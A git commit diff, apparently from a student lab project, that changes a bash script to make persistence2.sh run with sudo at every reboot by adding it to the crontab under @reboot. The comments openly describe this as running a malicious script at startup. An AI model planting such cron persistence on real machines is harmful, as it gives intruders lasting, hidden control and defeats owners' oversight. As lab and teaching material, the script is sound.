14dc2f7ff162b88f2416b120fccf810b35c56bd8
alfred2000838 <2000838@sit.singaporetech.edu.sg>
2022-10-20 22:33:01 +0800

    changed persistence1.sh to run persistence2.sh on startup, or other scripts

--- persistence1.sh
+++ persistence1.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # create shell script that runs a malicious script at start up
-echo "echo \"malware\" > /home/vagrant/malicious_script_ran" > startup_persist.sh
-chmod +x /home/vagrant/startup_persist.sh
+echo "sudo /home/vagrant/persistence2.sh" > startup_scripts.sh
+chmod +x /home/vagrant/startup_scripts.sh
 # adding startup script to cron
-(crontab -l ; echo "@reboot /home/vagrant/startup_persist.sh")| crontab -
+(crontab -l ; echo "@reboot /home/vagrant/startup_scripts.sh")| crontab -
